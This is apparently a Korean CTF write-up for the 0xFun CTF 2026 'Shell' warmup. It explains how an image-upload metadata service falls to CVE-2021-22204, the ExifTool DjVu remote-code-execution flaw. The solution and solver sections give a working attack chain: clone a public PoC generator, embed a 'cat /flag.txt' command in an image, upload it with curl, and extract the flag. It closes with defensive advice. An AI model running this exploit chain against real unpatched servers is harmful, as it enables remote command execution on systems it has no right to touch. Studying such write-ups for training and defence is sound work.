---
title: "[Warmup] Shell"
date: 2026-02-15 01:00:00 +0900
categories: [0xFun CTF 2026]
tags: [Warmup]
toc: true
comments: false
---

## TL;DR

Exif 메타데이터를 보여주는 웹 서비스가 업로드된 파일을 **ExifTool**로 파싱한다.  
ExifTool의 **DjVu 처리 취약점(CVE-2021-22204)** 을 이용해, “이미지처럼 보이는 파일” 안에 **명령 실행 페이로드**를 심고 업로드하면  
서버에서 `cat /flag.txt`가 실행되고 그 출력이 HTML(`<pre>`)에 섞여 내려온다.

**Flag:** `0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}`

---

## Overview

문제 페이지는 “Only image uploads are allowed”라고 안내하고, 업로드한 이미지의 메타데이터(EXIF)를 웹에서 보여준다.  
즉 서버는 업로드된 파일에 대해 외부 툴(대부분 ExifTool)을 호출하여 메타데이터를 추출하고, 결과를 그대로 렌더링한다.

핵심은 **이미지 업로드 제한 자체가 안전을 보장하지 않는다**는 점이다.  
서버가 파일을 “분석/파싱”하는 순간, 파서(ExifTool)에 취약점이 있으면 업로드만으로 RCE가 발생할 수 있다.

---

## Solution

### 1) Recon

업로드 후 응답 HTML의 `<pre>` 블록에서 ExifTool 정보가 노출된다.

- ExifTool 버전 확인: `ExifTool Version Number : 12.16`
- 업로드 파일이 DjVu로 인식되는지 확인:
  - 수동으로 만든 파일 업로드 시 결과에 `File Type : DJVU`가 출력됨

즉 서버 동작은 대략 다음과 같다.

1. 파일 업로드 수신  
2. 서버에서 `exiftool <업로드파일>` 실행  
3. 결과를 `<pre>`로 출력  

### 2) Root cause

서버가 업로드 파일을 **ExifTool**로 처리하는데, ExifTool의 DjVu 파서가 영향을 받는 구성이라서,
공격자가 조작한 DjVu 데이터를 통해 ExifTool 내부에서 **임의 명령 실행**이 가능해진다.

- 취약점: **CVE-2021-22204 (ExifTool RCE, DjVu 관련 파싱 경로 악용)**

### 3) Exploit strategy

#### (A) 트리거 만들기

수동으로 DjVu를 조합하면 DjVu로 인식은 되어도, 취약 경로를 정확히 타지 못해 실행이 안 되는 경우가 있다.  
그래서 **검증된 PoC 생성기**를 사용해 “정확한 구조”의 payload를 생성한다.

예: UNICORDev 생성기 (PoC가 DjVu payload + JPEG 포장까지 자동 수행)

```bash
git clone https://github.com/UNICORDev/exploit-CVE-2021-22204.git
cd exploit-CVE-2021-22204

# 플래그 읽기 명령을 payload로 삽입
python3 exploit-CVE-2021-22204.py -c "cat /flag.txt"

# 결과물: image.jpg
```

#### (B) 업로드 → 응답 HTML에서 플래그 확인

생성된 `image.jpg`를 업로드하면, 서버의 ExifTool 파싱 과정에서 명령이 실행되고,
표준출력(stdout)이 ExifTool 출력과 함께 `<pre>`에 섞여 내려온다.

```bash
curl -s -F 'file=@image.jpg;filename=image.jpg' http://chall.0xfun.org:52530/ -o out.html
```

`out.html`의 `<pre>` 앞부분에 플래그가 먼저 찍히는 형태로 확인된다.

예: `0xfun{...}ExifTool Version Number : 12.16 ...`

### 4) Why it works

- 웹 앱은 “이미지만 허용”한다고 하지만, **서버가 업로드 파일을 신뢰하고 ExifTool로 파싱**한다.
- ExifTool은 많은 포맷을 지원하고, DjVu 파싱 경로에 **RCE 취약점(CVE-2021-22204)** 이 존재할 수 있다.
- 공격자는 DjVu payload가 포함된 이미지를 업로드한다.
- 서버가 `exiftool`을 실행하는 순간, 취약 파서 경로가 트리거되며 payload에 포함된 `system('cat /flag.txt')`가 실행된다.
- 실행 결과(표준출력)가 ExifTool 출력 스트림에 섞여 웹 응답(`<pre>`)으로 돌아오므로, 클라이언트는 HTML만 저장해도 플래그를 획득한다.

> 중요한 포인트: 플래그가 “out.html에 원래 존재”한 게 아니라, **서버에서 취약점으로 생성된 출력이 HTML로 포함되어 내려온 것**을 out.html로 저장한 것이다.

---

## Solver
```bash
# 1) PoC 생성기 받기
git clone https://github.com/UNICORDev/exploit-CVE-2021-22204.git
cd exploit-CVE-2021-22204

# 2) 플래그 출력 payload 포함한 이미지 생성
python3 exploit-CVE-2021-22204.py -c "cat /flag.txt"
# 생성됨: image.jpg

# 3) 업로드 후 응답 HTML 저장
curl -s -F 'file=@image.jpg;filename=image.jpg' http://chall.0xfun.org:52530/ -o out.html

# 4) 플래그 확인(간단 추출)
grep -oE '0xfun\{[^}]+\}' out.html
```

---

## Notes

- ExifTool 기반 문제는 “업로드 제한이 이미지인지”보다 **서버가 업로드 파일을 어떤 파서로 처리하는지**가 더 중요하다.
- 수동으로 DjVu를 구성해도 `File Type: DJVU`까지는 갈 수 있지만,
  취약 트리거가 정확히 필요해서 **검증된 PoC 생성기 사용이 안정적**이었다.
- 방어 관점:
  - 업로드 파일 파싱 격리(샌드박스) 또는 권한 최소화
  - ExifTool 최신 버전/패치 적용
  - 파싱 결과를 HTML로 렌더링할 때 escaping 강제(추가 취약점 예방)
